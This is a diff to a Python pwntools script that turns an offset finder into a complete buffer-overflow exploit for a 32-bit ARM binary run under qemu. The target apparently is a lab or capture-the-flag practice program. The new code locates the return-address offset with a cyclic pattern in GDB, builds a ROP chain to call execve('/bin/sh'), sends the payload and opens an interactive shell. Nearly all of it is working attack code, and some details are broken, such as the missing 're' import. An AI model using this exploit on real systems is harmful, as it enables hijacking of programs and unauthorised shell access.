@@ -1,102 +1,106 @@
-import subprocess as subp
-import re
+#!/usr/bin/env python3
+
 import os
 from pwn import *
+import argparse
 
-def create_padding(length, padding_file='padding', n=8):
-    """
-    Create a file with a cyclic pattern of the specified length.
-    """
-    padding = cyclic(length, n=n)  # Generates a cyclic pattern
-    with open(padding_file, 'wb') as f:
-        f.write(padding)
-    # Print the first 16 bytes in hex to verify the cyclic pattern
-    print(f"Created padding of length {length} with first 16 bytes: {padding[:16].hex()}")
+context.arch = 'arm'  # Set the architecture to 32-bit ARM
+context.endian = 'little'  # Set the endianness
+context.os = 'linux'
 
-def check_padding(binary_path, padding_file, n=8):
-    """
-    Use GDB to check if the padding overwrites the return address.
-    """
-    gdb_command = [
-        'gdb', '--batch',
-        '--ex', f'run < {padding_file}',
-        '--ex', 'info registers pc',  # Get the Program Counter (PC) value
-        binary_path
+def find_offset(binary_path):
+    """Finds the offset to the return address using GDB."""
+    log.info("Finding buffer overflow offset using GDB...")
+    pattern = cyclic(200, n=4)  # Generate a pattern of length 200
+
+    # Prepare GDB commands
+    gdb_commands = [
+        "set pagination off",
+        "run",
+        "info registers pc",
+        "quit"
     ]
 
+    # Write GDB commands to a file
+    with open("gdb_script.gdb", "w") as f:
+        for cmd in gdb_commands:
+            f.write(cmd + "\n")
+
+    # Run GDB with the commands
+    gdb_command = [
+        "gdb-multiarch",
+        "-q",
+        "--batch",
+        "-x", "gdb_script.gdb",
+        "--args", "qemu-arm", binary_path
+    ]
+
+    # Run the process and provide the pattern as input
     try:
-        gdb_output = subp.run(
-            gdb_command, stdout=subp.PIPE, stderr=subp.PIPE, text=True
-        ).stdout
-        print(f"GDB Output:\n{gdb_output}")  # Debugging GDB output
+        p = process(gdb_command)
+        p.sendline(pattern)
+        gdb_output = p.recvall().decode()
     except Exception as e:
-        print(f"Error running GDB: {e}")
-        return False
+        log.error(f"GDB failed: {e}")
+        return -1
 
-    # Extract the PC value from GDB output
-    pc_match = re.search(r'pc\s+(0x[a-fA-F0-9]+)', gdb_output)
-    if pc_match:
-        pc = int(pc_match.group(1), 16)
-        print(f"Extracted PC: {hex(pc)}")
+    # Extract the PC value
+    pc_match = re.search(r'pc\s+0x([a-fA-F0-9]+)', gdb_output)
+    if not pc_match:
+        log.error("Failed to extract PC value from GDB output.")
+        return -1
 
-        # Convert PC to bytes in little endian
-        try:
-            pc_bytes = p64(pc)  # For 64-bit ARM
-            print(f"PC Bytes (little endian): {pc_bytes.hex()}")
-        except OverflowError:
-            pc_bytes = p32(pc)  # Adjust based on architecture
-            print("Using p32 instead of p64 for PC bytes.")
-            print(f"PC Bytes (little endian): {pc_bytes.hex()}")
+    pc = int(pc_match.group(1), 16)
+    log.info(f"Extracted PC: {hex(pc)}")
 
-        # Find the offset using cyclic_find
-        try:
-            offset = cyclic_find(pc_bytes, n=n)
-            print(f"Found offset: {offset}")
-            return offset
-        except cyclic.CyclicError:
-            print("Pattern not found in cyclic pattern.")
-            return False
+    # Find the offset
+    try:
+        offset = cyclic_find(pc, n=4)
+        log.success(f"Found offset: {offset}")
+    except ValueError:
+        log.error("Failed to find offset in the cyclic pattern.")
+        offset = -1
 
-    print("No PC value found in GDB output.")
-    return False  # If no match is found
+    return offset
 
-def find_offset(binary_path, n=8, max_length=1024):
-    """
-    Finds the offset to overwrite the return address in the vulnerable binary.
-    """
-    padding_file = 'padding'
-    low = 0
-    high = max_length
 
-    while low < high:
-        guess = (low + high) // 2
-        create_padding(guess, padding_file, n=n)
-        print(f"Testing padding length: {guess}")
+def build_rop_chain(binary_path, bin_sh_addr):
+    """Builds the ROP chain to execute execve('/bin/sh', NULL, NULL)."""
+    elf = ELF(binary_path)
+    rop = ROP(elf)
 
-        result = check_padding(binary_path, padding_file, n=n)
-        if isinstance(result, int):
-            os.remove(padding_file)
-            return result
+    # Find gadgets
+    rop.call('execve', [bin_sh_addr, 0, 0])
 
-        if result:
-            high = guess
-        else:
-            low = guess + 1
+    log.info("ROP chain:")
+    log.info(rop.dump())
+    return rop.chain()
 
-    os.remove(padding_file)
-    return -1  # Indicate failure
+def exploit(binary_path):
+    offset = find_offset(binary_path)
+
+    # Load the binary
+    elf = ELF(binary_path)
+
+    # Address of "/bin/sh" string in the binary or write it to memory
+    bin_sh = next(elf.search(b'/bin/sh\x00'))
+
+    # Build the ROP chain
+    rop_chain = build_rop_chain(binary_path, bin_sh)
+
+    # Construct the payload
+    payload = fit({
+        offset: rop_chain
+    }, length=offset + len(rop_chain))
+
+    # Run the binary and send the payload
+    p = process(['qemu-arm', binary_path])
+    p.sendline(payload)
+    p.interactive()  # Get an interactive shell
 
 if __name__ == "__main__":
-    # Update this with the actual path to your binary
-    binary_path = "../examples/bin/vuln_program_1"
+    parser = argparse.ArgumentParser(description="Exploit script for vuln_program")
+    parser.add_argument("binary", help="Path to the vulnerable binary")
+    args = parser.parse_args()
 
-    # Determine architecture (32 or 64-bit)
-    elf = ELF(binary_path)
-    n = 4
-
-    print(f"Finding offset for binary: {binary_path} (Architecture: {elf.bits}-bit)...")
-    offset = find_offset(binary_path, n=n)
-    if offset != -1:
-        print(f"Offset found: {offset}")
-    else:
-        print("Failed to find the offset.")
+    exploit(args.binary)
